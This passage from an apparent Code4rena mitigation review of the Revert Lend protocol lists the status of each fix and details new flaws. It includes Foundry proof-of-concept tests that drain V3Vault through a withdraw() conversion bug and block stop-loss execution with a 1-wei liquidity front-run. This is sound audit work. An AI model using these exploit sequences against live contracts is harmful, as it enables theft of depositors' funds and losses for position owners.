| https://github.com/revert-finance/lend/pull/12 | M-18 | Fixed | 
| https://github.com/revert-finance/lend/pull/26 | M-19 | Fixed | 
| https://github.com/revert-finance/lend/pull/25 | M-20 | Fixed | 
| https://github.com/revert-finance/lend/pull/24 | M-21 | Added deadline where missing | 
| https://github.com/revert-finance/lend/pull/11 | M-22 | Fixed | 
| https://github.com/revert-finance/lend/pull/7 | M-24 | Fixed calculation | 
| https://github.com/revert-finance/lend/pull/5 | M-25 | Fixed calculation | 

## Additional Scope to be reviewed

| URL | Mitigation of | Purpose | 
| ----------- | ------------- | ----------- |
| https://github.com/revert-finance/lend/pull/13 | [Original QA Issue #220](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/220) | Improper return of `chainlinkReferencePriceX96` | 
| https://github.com/revert-finance/lend/pull/27 | [Medium Bot-Report Issue #12](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/12) | Missing L2 sequencer checks for Chainlink oracle | 
| https://github.com/revert-finance/lend/pull/28 | [Medium Bot-Report Issue #14](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/14) | Some ERC20 can revert on a zero value transfer | 
| https://github.com/revert-finance/lend/pull/31 | N/A - QA, GAS | Several small changes to address QA and GAS optimization issues. | 
| https://github.com/revert-finance/lend/pull/33 | N/A - QA, GAS | Several small changes to address QA and GAS optimization issues. | 
| https://github.com/revert-finance/lend/pull/34 | N/A - QA, GAS | Several small changes to address QA and GAS optimization issues. | 

## Out of Scope

| Issue | Comments | 
| ----------- | ----------- |
| M-01 | Acknowledged, see comments [in original Issue #466](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/466). | 
| M-02 | Acknowledged, this is solved off-chain by the operator bots, see discussion [in original Issue #459](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/459). | 
| M-03 | Acknowledged, at deployment a resonable value will be set for `minLoanSize`. | 
| M-04 | Acknowledged, we will monitor for this behaviour and adjust config if needed, see discussion [in original Issue #435](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/435). | 
| M-13 | Acknowledged, see comment [in original Issue #256](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/256). | 
| M-17 | Acknowledged, see comment [in original Issue #216](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/216). | 
| M-23 | Acknowledged, this is solved off-chain by the operator bots. | 

## Mitigation Review Summary

**The wardens confirmed the mitigations for all in-scope findings except for M-12 (Unmitigated) and [Medium Bot-Report Issue #12](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/12) (Medium severity mitigation error). They also surfaced several new issues: 1 High severity and 3 Medium severity.**

| Original Issue | Status | Full Details |
| --- | --- | --- |
| H-01 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/76), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/9) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/7) |
| H-02 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/77), [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/44) and [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/14) |
| H-03 | 🟢 Mitigation Confirmed | Reports from [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/8), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/78) and [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/19) |
| H-04 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/79), [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/43) and [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/22) |
| H-05 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/80), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/26) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/10) |
| H-06 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/81), [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/36) and [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/27) |
| M-05 | 🟢 Mitigation Confirmed | Reports from [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/28), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/82) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/11) |
| M-06 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/83), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/29) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/12) |
| M-07 | 🟢 Mitigation Confirmed | Reports from [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/3), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/84) and [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/62) |
| M-08 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/85), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/30) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/13) |
| M-09 | 🟢 Mitigation Confirmed | Reports from [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/31), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/86) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/15) |
| M-10 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/87), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/32) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/2) |
| M-11 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/88) and [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/40) |
| M-12 | 🔴 Unmitigated | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/89), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/64) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/17) |
| M-14 | 🟢 Mitigation Confirmed | Report from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/100) |
| M-15 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/91), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/48) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/18) |
| M-16 | 🟢 Mitigation Confirmed | Reports from [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/49), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/92) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/20) |
| M-18 | 🟢 Mitigation Confirmed | Reports from [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/50), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/93) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/35) |
| M-19 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/94), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/51) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/4) |
| M-20 | 🟢 Mitigation Confirmed | Reports from [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/54), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/95) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/21) |
| M-21 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/96), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/55) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/23) |
| M-22 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/97), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/56) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/24) |
| M-24 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/98), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/57) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/25) |
| M-25 | 🟢 Mitigation Confirmed | Reports from [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/33) and [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/58) |
| [Original QA Issue #220](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/220) | 🟢 Mitigation Confirmed | Reports from [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/59), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/70) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/6) |
| [Medium Bot-Report Issue #12](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/12) | 🔴 Mitigation Error | Reports from [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/5), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/60) and [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/71)  |
| [Medium Bot-Report Issue #14](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/14) | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/72), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/61) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/34) |
| QA/Gas: PR 31 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/73), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/68) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/37) |
| QA/Gas: PR 33 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/74), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/69) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/38) |
| QA/Gas: PR 34 | 🟢 Mitigation Confirmed | Reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/75), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/67) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/39) |

## [[M-12] Unmitigated](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/89)
*Submitted by [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/89), also found by [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/64) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/17)*

### Original issue

[M-12: Wrong global lending limit check in `_deposit` function](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/324)

### Comments

Revert utilizes a global lend limit to ensure that lenders do not exceed a global lend limit. Unfortunately, the global lend limit is denominated in assets. The value it compares itself to is `totalSupply()`, which is denominated in shares. This comparison is invalid since both values are in different denominations.
 
### Lines of code

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol?plain=1#L961-L963

### Vulnerability details

The `_deposit()` function incorrectly utilizes the wrong denomination when comparing the `globalLendLimit` to the number of shares. The `globalLendLimit` denomination is set in assets. However, `totalSupply() + shares` denomination is set in shares. This makes this comparison check incorrect and can lead to more assets being lent than anticipated. 
 
### Impact

More assets may be deposited than expected. 

### Proof of Concept

Reviewing the function below:

```solidity
if (totalSupply() + shares > globalLendLimit) {
    revert GlobalLendLimit();
}
```

Since `totalSupply() + shares` are denominated as shares and `globalLendLimit` as assets, the comparison is incorrect.

### Recommended Mitigation Steps

Convert the `totalSupply() + shares` to the correct denomination in assets:

```solidity
uint256 totalSharesDenominatedInAssets = _convertToAssets(totalSupply() + shares, newLendExchangeRateX96, Math.Rounding.Up);
if (totalSharesDenominatedInAssets > globalLendLimit) {
      revert GlobalLendLimit();
}
```
 
### Assessed type

Math 

*** 

## [[Medium Bot-Report Issue #12] Mitigation Error](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/5)

*Submitted by [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/5), also found by [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/60) and [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/71)*

https://github.com/revert-finance/lend/blob/audit/src/V3Oracle.sol#L360-L362

### Original issue

[Missing L2 sequencer checks for Chainlink oracle](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/12)

### Impact

**Wrong logic in L2 sequencer check:**

If `sequencerUptimeFeed` is set, then the function will revert most of the time and affect a lot of other functions in Revert Lend.

### Proof of concept

The original issue is fixed by [PR #27](https://github.com/revert-finance/lend/pull/27). The mitigation code adds sequencer check as follows:

```solidity
// sequencer check on chains where needed
        if (sequencerUptimeFeed != address(0)) {
            (, int256 sequencerAnswer, uint256 startedAt,,) =
                AggregatorV3Interface(sequencerUptimeFeed).latestRoundData();

            // Answer == 0: Sequencer is up
            // Answer == 1: Sequencer is down
            if (sequencerAnswer == 0) {
                revert SequencerDown();
            }

            // Make sure the grace period has passed after the
            // sequencer is back up.
            uint256 timeSinceUp = block.timestamp - startedAt;
            if (timeSinceUp <= SEQUENCER_GRACE_PERIOD_TIME) {
                revert SequencerGracePeriodNotOver();
            }
        }
```

However, as you can see in the comment `sequencerAnswer == 0` indicates that the sequencer is up, yet in that case the code reverts with `SequencerDown` error (wrong logic).

This logic is also stated in the [docs](https://docs.chain.link/data-feeds/l2-sequencer-feeds):
> The message calls the `updateStatus` function in the `ArbitrumSequencerUptimeFeed` contract and updates the latest sequencer status to `0` if the sequencer is up and `1` if it is down.

Since most of the time the the sequencer is up (`sequencerAnswer == 0`), the function will revert most of the time and affect many other functions/contracts.

### Recommended Mitigation Steps

Change `if (sequencerAnswer == 0)` to `if (sequencerAnswer == 1)`.

### Assessed type

Invalid Validation

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/5#issuecomment-2083635933)**

***

## [Lenders can drain the `Vault` when withdrawing](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/65)

*Submitted by [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/65)*

**Severity: High**

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L1007-L1010

### Impact

`V3Vault` can be drained through the `withdraw()` function due to improper asset conversion.

### Vulnerability

[PR-14](https://github.com/revert-finance/lend/pull/14/files) introduced a couple of updates to the `V3Vault` contract in response [to this finding](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/222) in order to prevent liquidations from getting DOSed.

A changes has also been introduced to `_withdraw()` so that instead of reverting when a lender tries to withdraw more shares than he owns, the amount is automatically reduced to the max withdrawable shares for that lender. This is how the change looks:

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L1007-L1010

```solidity

 function _withdraw(address receiver, address owner, uint256 amount, bool isShare)
        internal
        returns (uint256 assets, uint256 shares)
    {
        ....

        if (isShare) {
            shares = amount;
            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);
        } else {
            assets = amount;
            shares = _convertToShares(amount, newLendExchangeRateX96, Math.Rounding.Up);
        }

+        uint256 ownerBalance = balanceOf(owner);
+        if (shares > ownerBalance) {
+            shares = ownerBalance;
+            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);
+        }

        ....
    }
```

The problem is that the newly added code does not use the proper variable to convert the owner shares to assets. If you look closely you will see that `_convertToAssets()` uses `amount` instead of `shares` . 

In the case the function is called with `isShare == true` (e.g `redeem()`) everything will be ok, since `amount == shares`.
However, if `_withdraw()` is called with `isShare == false` (e.g `withdraw()`) the conversion will be wrong, because `amount == assets`. This will inflate the assets variable and since there are no checks after that to prevent it, more tokens will be transferred to the owner than he owns.

### POC

I've coded a short POC in the `V3Vault.t.sol` test file to demonstrate the vulnerability

Short summary of the POC:

- A deposit is created for 10 USDC.
- The vault is funded with additional assets.
- `lastLendExchangeRateX96` is increased by 2% to simulate exchange rate dynamics.
- Owner calls `withdraw()` with an amount that is above the shares he owns so that the check can be activated.
- Owner receives the original `10 USDC + 10.3 USDC` on top, effectively draining the pool.

```solidity
using stdStorage for StdStorage;
....
function testWithdrawExploit(uint256 amount) external {
        // 0 borrow loan
        _setupBasicLoan(false);

        // provide additional 1000 USDC to vault
        deal(address(USDC), address(vault), 1000e6);

        uint256 lent = vault.lendInfo(WHALE_ACCOUNT);
        uint256 lentShares = vault.balanceOf(WHALE_ACCOUNT);

        // check max withdraw
        uint256 maxWithdrawal = vault.maxWithdraw(WHALE_ACCOUNT);

        // total available assets in vault is 1e9
        assertEq(vault.totalAssets(), 1e9);

        // lender can withdraw max 1e7 based on his shares
        assertEq(maxWithdrawal, 1e7);

        // balance before transfer
        uint256 balanceBefore = USDC.balanceOf(WHALE_ACCOUNT);

        // simulate lend exchange rate increases by 2%
        stdstore
            .target(address(vault))
            .sig("lastLendExchangeRateX96()")
            .checked_write(Q96 + ((Q96 * 2) / 100));

        vm.prank(WHALE_ACCOUNT);
        // activate  `shares > ownerBalance` check
        // by trying to withdraw more shares than owned
        vault.withdraw(maxWithdrawal * 2, WHALE_ACCOUNT, WHALE_ACCOUNT);

        // balance after transfer
        uint256 balanceAfter = USDC.balanceOf(WHALE_ACCOUNT);

        uint256 withdrawn = balanceAfter - balanceBefore;

        // lender has withdrawn more than he should
        assertGt(withdrawn, maxWithdrawal);

        // for initial deposit of 10 USDC, the lender received 10 USDC extra
        assertEq(withdrawn - maxWithdrawal, 10399999);
    }
```

### Recommended Mitigation

Refactor the newly added check inside `_withdraw()` to use `shares` instead of `amount`:

```solidity
 uint256 ownerBalance = balanceOf(owner);
        if (shares > ownerBalance) {
            shares = ownerBalance;
-            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);
+            assets = _convertToAssets(shares, newLendExchangeRateX96, Math.Rounding.Down);
        }
```

### Assessed type

Invalid Validation

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/65#issuecomment-2083681995)**

***

## [An attacker can DOS `AutoExit` and `AutoRange` transformers and incur losses for position owners](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/66)

*Submitted by [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/66)*

**Severity: Medium**

An exploiter can block the execution of `AutoExit` and `AutoRange` transformers, which leads to the following consequences:
- `Limit orders` and `Stoploss orders` - position owners won't be able to exit a bad market and will suffer losses.
- `Autorange orders` - positions that go out-of-range won't be rebalanced leading to missed profits or direct losses.
 
### Vulnerability details

The `AutoRange.sol` and `AutoExit.sol` contracts serve the following functionality in Revert Lend:

[`AutoRange.sol` contract](https://docs.revert.finance/revert/auto-range)
> Auto-Range automates the process of rebalancing your liquidity positions. When the token price moves and your position goes out-of-range by your selected percentage, the system then automatically rebalances your position`

[`AutoExit` contract](https://docs.revert.finance/revert/auto-exit)
> Auto-Exit lets you pre-configure a position so that the liquidity is automatically withdrawn when the pool price reaches a predetermined value. Moreover, you can optionally configure the system to swap from one token to the other on withdrawal, providing a safety net for your investments akin to a stop-loss order.

Both of those contracts implement an `execute()` function that respectively transforms an NFT position based on the parameters provided to it. It can only be called by revert controlled bots (operators) which owners have approved for their position or by the `V3Vault` through it's `transform()` function.

The problem in both of those contracts is that the `execute()` function includes a validation that allows malicious users to DOS transaction execution and thus compromise the safety and integrity of the managed positions.

`AutoExit::execute()`:

https://github.com/revert-finance/lend/blob/audit/src/automators/AutoExit.sol#L130

```solidity
 function execute(ExecuteParams calldata params) external {
        ....       
 
        // get position info
        (,, state.token0, state.token1, state.fee, state.tickLower, state.tickUpper, state.liquidity,,,,) =
            nonfungiblePositionManager.positions(params.tokenId);

        ....
        
        // @audit can be front-run and prevent execution
        if (state.liquidity != params.liquidity) {
            revert LiquidityChanged();
        }

        ....
    }
```

`AutoRange::execute()`:

https://github.com/revert-finance/lend/blob/audit/src/transformers/AutoRange.sol#L139
```solidity
function execute(ExecuteParams calldata params) external {
        ....       
 
        // get position info
        (,, state.token0, state.token1, state.fee, state.tickLower, state.tickUpper, state.liquidity,,,,) =
            nonfungiblePositionManager.positions(params.tokenId);
        
        // @audit can be front-run and prevent execution
        if (state.liquidity != params.liquidity) {
            revert LiquidityChanged();
        }

        ....
    }
```

The problematic validation shared in both function is this one:

```solidity
// @audit can be front-run and prevent execution
      if (state.liquidity != params.liquidity) {
          revert LiquidityChanged();
      }
```

The check is meant to ensure that the execution parameters the transaction was initiated with, are executed under the same conditions (the same liquidity) that were present when revert bots calculated them off-chain.

The main issue here arises from the fact that liquidity of a position inside `NonfungiblePositionManager` can be manipulated by anyone. More specifically `NonfungiblePositionManager::increaseLiquidity()` can be called freely, which means that liquidity can be added to any NFT position without restriction.

This can be validated by looking at `NonfungiblePositionManager::increaseLiquidity()`:

https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/NonfungiblePositionManager.sol#L198C14-L198C31

```solidity
 function increaseLiquidity(IncreaseLiquidityParams calldata params)
        external
        payable
        override     //<---------- No `isAuthorizedForToken` modifier - anyone can call
        checkDeadline(params.deadline)
        returns (
            uint128 liquidity,
            uint256 amount0,
            uint256 amount1
        )
    { ... }

....

function decreaseLiquidity(DecreaseLiquidityParams calldata params)
        external
        payable
        override
        isAuthorizedForToken(params.tokenId) // <------- Only position owner can call
        checkDeadline(params.deadline)
        returns (uint256 amount0, uint256 amount1)
    { ... }
```

All of this allows any attacker to exploit the check at practically zero cost.

### POC

I've coded a POC to prove how for the cost of `1 wei` (basically free) an attacker prevents a stop loss order for a position from being executed.

I've added the following test to `AutoExit.t.sol`, reusing the logic from the `testStopLoss()` test:

<details>

```solidity
function testExploitStopLoss() external {
        vm.prank(TEST_NFT_2_ACCOUNT);
        NPM.setApprovalForAll(address(autoExit), true);

        vm.prank(TEST_NFT_2_ACCOUNT);
        autoExit.configToken(
            TEST_NFT_2,
            AutoExit.PositionConfig(
                true,
                true,
                true,
                -84121,
                -78240,
                uint64(Q64 / 100),
                uint64(Q64 / 100),
                false,
                MAX_REWARD
            )
        ); // 1% max slippage

        (, , , , , , , uint128 liquidity, , , , ) = NPM.positions(TEST_NFT_2);

        // create a snapshot of state before transformation
        uint256 snapshot = vm.snapshot();

        // --- NORMAL SCENARIO ---

        // executes correctly
        vm.prank(OPERATOR_ACCOUNT);
        autoExit.execute(
            AutoExit.ExecuteParams(
                TEST_NFT_2,
                _getWETHToDAISwapData(),
                liquidity,
                0,
                0,
                block.timestamp,
                MAX_REWARD
            )
        );

        // --- ATTACKER SCENARIO ---

        // go back to the state before transformation
        // and replay the scenario with front-running
        vm.revertTo(snapshot);

        // random attacker address
        address attacker = address(101);
        deal(address(WETH_ERC20), attacker, 10_000);

        // attacker sends dust amount to change liquidity
        vm.startPrank(attacker);
        WETH_ERC20.approve(address(NPM), 1);
        (, , uint256 amount1) = NPM.increaseLiquidity(
            INonfungiblePositionManager.IncreaseLiquidityParams(
                TEST_NFT_2,
                0,
                1,
                0,
                0,
                block.timestamp
            )
        );
        vm.stopPrank();

        // liquidity increased by 1 wei
        assertEq(amount1, 1);

        // AutoExit is DOSed and StopLoss was blocked
        vm.prank(OPERATOR_ACCOUNT);
        // reverts with liquidity changed
        vm.expectRevert(Constants.LiquidityChanged.selector);
        autoExit.execute(
            AutoExit.ExecuteParams(
                TEST_NFT_2,
                _getWETHToDAISwapData(),
                liquidity,
                0,
                0,
                block.timestamp,
                MAX_REWARD
            )
        );
    }
```

</details>

### Recommended mitigation steps

Consider removing the problematic check from both functions, since it can cause more harm than good in this particular scenario.

### Assessed type

DoS

**[kalinbas (Revert) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/66#issuecomment-2083680451):**
> We agree with this finding and will remove the check. But this should be at max a medium risk as there is no direct loss of funds. It's more of a DOS (which could be resolved by using flashbots for example).

**[b0g0 (warden) commented](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/66#issuecomment-2084432887):**
> This finding includes the `AutoExit.sol` case where a DOS leads to a significantly more serious impact. Here are the arguments
[
`AutoExit.sol` is documented to:](https://github.com/revert-finance/lend/blob/audit/src/automators/AutoExit.sol#L6-L9)
>> Lets a v3 position to be automatically removed (limit order) or swapped to the opposite token (stop loss order) when it reaches a certain tick.
>
>Here are short definitions of the 2 operations from Investopedia:
>
>[ `Limit Order` definition](https://www.investopedia.com/terms/l/limitorder.asp)
>>A limit order guarantees that an order is filled at or better than a specific price level. Limit orders can be used in conjunction with stop orders to prevent large downside losses.
>
>[`Stop Loss` definition](https://www.investopedia.com/articles/stocks/09/use-stop-loss.asp)
>>A stop-loss is designed to limit an investor's loss on a security position that makes an unfavorable move.
>
>Both of those operations are very time-bound, especially the  `Stop Loss` order, where the idea is that the position owner configures a threshold at which he should exit the market or else his position will sustain losses. In case the price (ticks) drop below that threshold, DOSing execution even for a shorter amount of time  can seriously affect the position, especially if it is a big one and the market is very active and volatile (like in a bull run) - the longer the position does NOT exit the market, the greater the losses.
>
>DOSing here will not cost much compared to how it can affect a position.

**[ronnyx2017 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/66#issuecomment-2092360576):**
> I think the attack in `AutoExit` is more convincing, although passing specific parameters in auto range might produce a similar effect. However, since this exploitation is based on MEV, we should assume that the parameters in the original tx are not edge. This report elaborates more thoroughly on the exploitation scenarios and impacts, giving me the confidence to mark it as Medium.

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/66).*

***

## [`V3Vault::maxWithdrawal` incorrectly converts balance to assets](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/63)

*Submitted by [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/63), also found by [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/42) and [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/90)*

**Severity: Medium**

The `maxWithdrawal()` function of `V3Vault` calculates the maximum amount of underlying tokens an account can withdraw based on the shares it owns.

The initial problem with `maxWithdrawal()` and `V3Vault` overall was that they were not implemented according to the specs of ERC-4626 standard [as outlined in the original issue](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/249). In the case of `maxWithdrawal()` it did not consider the following [part of the spec](https://eips.ethereum.org/EIPS/eip-4626):

> MUST factor in both global and user-specific limits, like if withdrawals are entirely disabled (even temporarily) it MUST return `0`.

In order to remediate the issue and make the `V3Vault` ERC-4626 compliant, protocol devs [prepared this PR](https://github.com/revert-finance/lend/pull/15/files), where `maxWithdrawal()` was refactored so that it includes the actual daily limit that is applied when withdrawing assets:

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L335-L347

```solidity
 function maxWithdraw(address owner) external view override returns (uint256) {
-        (, uint256 lendExchangeRateX96) = _calculateGlobalInterest();
-        return _convertToAssets(balanceOf(owner), lendExchangeRateX96, Math.Rounding.Down);

+        (uint256 debtExchangeRateX96, uint256 lendExchangeRateX96) = _calculateGlobalInterest();

+        uint256 ownerShareBalance = balanceOf(owner);
+        uint256 ownerAssetBalance = _convertToAssets(ownerShareBalance, lendExchangeRateX96, Math.Rounding.Down);

+        (uint256 balance, ) = _getBalanceAndReserves(debtExchangeRateX96, lendExchangeRateX96);
+        if (balance > ownerAssetBalance) {
+            return ownerAssetBalance;
+        } else {
+            return _convertToAssets(balance, lendExchangeRateX96, Math.Rounding.Down);
+        }
    }
```

The problem with the new code is this part:

```solidity
   // @audit balance is already converted to assets
   (uint256 balance, ) = _getBalanceAndReserves(debtExchangeRateX96, lendExchangeRateX96);

    // @audit - converts to assets a second time
    } else {
        return _convertToAssets(balance, lendExchangeRateX96, Math.Rounding.Down);
    }
```

If we take a look at `_getBalanceAndReserves()` we can see that the returned `balance` is already converted to `assets`:

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L1107-L1116

```solidity
function _getBalanceAndReserves(uint256 debtExchangeRateX96, uint256 lendExchangeRateX96)
        internal
        view
        returns (uint256 balance, uint256 reserves)
    {
 --->       balance = totalAssets();
        uint256 debt = _convertToAssets(debtSharesTotal, debtExchangeRateX96, Math.Rounding.Up);
        uint256 lent = _convertToAssets(totalSupply(), lendExchangeRateX96, Math.Rounding.Up);
        reserves = balance + debt > lent ? balance + debt - lent : 0;
    }
```

This means that `maxWithdraw()` improperly converts `balance` a second time and will overinflate the result, especially when `debtExchangeRateX96` is high. 

### Impact

`V3Vault::maxWithdraw()` inflates the actual amount that can be withdrawn, which can impact badly protocols and contracts integrating with the vault. The possibility is quite real considering that `maxWithdraw()` is part of the official ERC-4626 which is very widely adopted.

### Recommended mitigation steps

